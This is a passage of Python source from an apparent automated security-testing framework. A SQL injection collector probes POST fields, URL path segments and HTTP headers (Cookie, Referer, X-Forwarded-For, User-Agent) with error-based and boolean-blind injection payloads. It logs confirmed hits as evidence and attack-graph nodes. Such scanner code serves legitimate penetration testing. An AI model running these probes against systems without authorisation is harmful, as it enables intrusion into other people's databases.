                        pass
                elif raw_params and method == "POST":
                    post_fields = dict(raw_params)

            if post_fields:
                clean_target_url = urllib.parse.urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path, "", "", ""
                ))
                for field_name in list(post_fields.keys()):
                    field_vuln_found = False

                    # 2.1 Error-Based on POST Body
                    for payload in error_payloads:
                        mutated_body = dict(post_fields)
                        mutated_body[field_name] = payload

                        if is_json_body:
                            resp = self._execute_request(mission, "POST", clean_target_url, json_data=mutated_body, headers=headers_data)
                        else:
                            resp = self._execute_request(mission, "POST", clean_target_url, data=mutated_body, headers=headers_data)

                        if not resp:
                            continue

                        analysis = self.analyzer.analyze_error_based(resp, baseline=baseline_resp, payload=payload)
                        if analysis:
                            vuln_key = f"{parsed_url.path}:{field_name}:post:{analysis['template_id']}"
                            if vuln_key not in confirmed_vuln_keys:
                                confirmed_vuln_keys.add(vuln_key)
                                ev = self._create_evidence_and_update_state(
                                    mission=mission,
                                    target_url=clean_target_url,
                                    base_url=base_url,
                                    param=field_name,
                                    param_type="post_body",
                                    payload=payload,
                                    status_code=getattr(resp, "status_code", 200) or 200,
                                    analysis=analysis,
                                )
                                detected_evidence.append(ev)
                                field_vuln_found = True
                                break

                    # 2.2 Boolean-Based on POST Body
                    if not field_vuln_found:
                        for true_payload, false_payload in boolean_pairs:
                            body_true = dict(post_fields)
                            body_true[field_name] = true_payload
                            body_false = dict(post_fields)
                            body_false[field_name] = false_payload

                            if is_json_body:
                                true_resp = self._execute_request(mission, "POST", clean_target_url, json_data=body_true, headers=headers_data)
                                false_resp = self._execute_request(mission, "POST", clean_target_url, json_data=body_false, headers=headers_data)
                            else:
                                true_resp = self._execute_request(mission, "POST", clean_target_url, data=body_true, headers=headers_data)
                                false_resp = self._execute_request(mission, "POST", clean_target_url, data=body_false, headers=headers_data)

                            if true_resp and false_resp:
                                analysis = self.analyzer.analyze_boolean_blind(
                                    true_resp=true_resp,
                                    false_resp=false_resp,
                                    baseline=baseline_resp,
                                    true_payload=true_payload,
                                    false_payload=false_payload,
                                )
                                if analysis:
                                    vuln_key = f"{parsed_url.path}:{field_name}:post:{analysis['template_id']}"
                                    if vuln_key not in confirmed_vuln_keys:
                                        confirmed_vuln_keys.add(vuln_key)
                                        ev = self._create_evidence_and_update_state(
                                            mission=mission,
                                            target_url=clean_target_url,
                                            base_url=base_url,
                                            param=field_name,
                                            param_type="post_body",
                                            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                                            status_code=getattr(true_resp, "status_code", 200) or 200,
                                            analysis=analysis,
                                        )
                                        detected_evidence.append(ev)
                                        field_vuln_found = True
                                        break

            # -------------------------------------------------------------
            # Vector 3: Path Segments
            # -------------------------------------------------------------
            path_segments = [s for s in parsed_url.path.strip("/").split("/") if s]
            if path_segments and any(s.isdigit() or len(s) > 15 for s in path_segments):
                for idx, segment in enumerate(path_segments):
                    if segment.isdigit() or len(segment) > 15:
                        for payload in error_payloads[:5]:
                            mutated_segments = list(path_segments)
                            mutated_segments[idx] = f"{segment}{payload}"
                            new_path = "/" + "/".join(mutated_segments)
                            target_url = urllib.parse.urlunparse((
                                parsed_url.scheme, parsed_url.netloc, new_path,
                                parsed_url.params, parsed_url.query, parsed_url.fragment,
                            ))

                            resp = self._execute_request(mission, "GET", target_url, headers=headers_data)
                            if not resp:
                                continue

                            analysis = self.analyzer.analyze_error_based(resp, baseline=baseline_resp, payload=payload)
                            if analysis:
                                vuln_key = f"{parsed_url.path}:path_segment_{idx}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=target_url,
                                        base_url=base_url,
                                        param=f"path_segment_{idx}",
                                        param_type="path",
                                        payload=payload,
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    break

            # -------------------------------------------------------------
            # Vector 4: HTTP Headers (Cookie, Referer, X-Forwarded-For)
            # -------------------------------------------------------------
            header_targets = [
                ("Cookie", "session_id={payload}"),
                ("Referer", "{base_url}/{payload}"),
                ("X-Forwarded-For", "127.0.0.1'{payload}"),
                ("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) {payload}"),
            ]
            for header_name, template_fmt in header_targets:
                for payload in error_payloads[:4]:
                    injected_val = template_fmt.format(payload=payload, base_url=base_url)
                    mut_headers = dict(headers_data)
                    mut_headers[header_name] = injected_val

                    clean_url = urllib.parse.urlunparse((
                        parsed_url.scheme, parsed_url.netloc, parsed_url.path, "", "", ""
                    ))
                    resp = self._execute_request(mission, "GET", clean_url, headers=mut_headers)
                    if not resp:
                        continue

                    analysis = self.analyzer.analyze_error_based(resp, baseline=baseline_resp, payload=payload)
                    if analysis:
                        vuln_key = f"{parsed_url.path}:{header_name}:{analysis['template_id']}"
                        if vuln_key not in confirmed_vuln_keys:
                            confirmed_vuln_keys.add(vuln_key)
                            ev = self._create_evidence_and_update_state(
                                mission=mission,
                                target_url=clean_url,
                                base_url=base_url,
                                param=header_name,
                                param_type="header",
                                payload=payload,
                                status_code=getattr(resp, "status_code", 200) or 200,
                                analysis=analysis,
                            )
                            detected_evidence.append(ev)
                            break

        logger.info(
            f"SQLInjectionCollector complete: {len(detected_evidence)} SQL injection vulnerability(ies) identified."
        )
        return detected_evidence

    def _create_evidence_and_update_state(
        self,
        mission: Any,
        target_url: str,
        base_url: str,
        param: str,
        param_type: str,
        payload: str,
        status_code: int,
        analysis: Dict[str, Any],
    ) -> Evidence:
        """
        Constructs Evidence, appends to mission.evidence & mission.vulnerabilities,
        and expands the KnowledgeGraph attack surface with HAS_ENDPOINT and HAS_VULNERABILITY edges.
        """
        raw_mission = getattr(mission, "_mission", mission)
        template_id = analysis.get("template_id", "sqli")
        technique = analysis.get("technique", "error_based")
        severity = analysis.get("severity", "critical")
        confidence = analysis.get("confidence", 0.95)
        snippet = analysis.get("snippet", "")
        dbms = analysis.get("dbms", "database")

        parsed_url = urllib.parse.urlparse(target_url)
        url_path = parsed_url.path or "/"

        technique_labels = {
            "error_based": f"Error-Based ({dbms.upper()})",
            "boolean_blind": "Boolean-Based Blind",
            "time_blind": "Time-Based Blind Delay",
        }
        tech_label = technique_labels.get(technique, technique)

        title = f"SQL Injection: {param} on {target_url}"
        description = (
            f"SQL Injection ({tech_label}) vulnerability confirmed on endpoint {target_url} "
            f"via {param_type} parameter '{param}' using payload '{payload}'. "
            f"Evidence: {snippet[:200]}"
        )

        ev = Evidence(
            mission_id=getattr(raw_mission, "id", ""),
            source_type="LOG",
            created_by="SYSTEM_GENERATED",
            title=title,
            description=description,
            category="sql_injection",
            value=target_url,
            source=target_url,
            status="CONFIRMED",
            confidence=confidence,
            severity=severity,
            provenance=ProvenanceData(
                step_id="sql_injection_collector",
            ),
            tags=["sql_injection", "sqli", technique, template_id],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "category": "sql_injection",
                "severity": severity,
                "technique": technique,
                "template_id": template_id,
                "dbms": dbms,
                "status_code": status_code,
                "evidence_snippet": snippet[:250],
            },
        )

        # 1. Add to raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Add to raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": f"SQL Injection ({tech_label})",
                "template_id": template_id,
                "severity": severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "technique": technique,
                "dbms": dbms,
            })

        # 3. KnowledgeGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{template_id}:{target_url}:{param}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=f"SQL Injection ({tech_label})", metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. Safe publish to ControlledMission wrapper
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.id, ev)
            except Exception:
                pass

        return ev

    def execute(self, mission: Any) -> List[Evidence]:
        """Plugin / Specialist adapter interface."""
        return self.collect(mission)
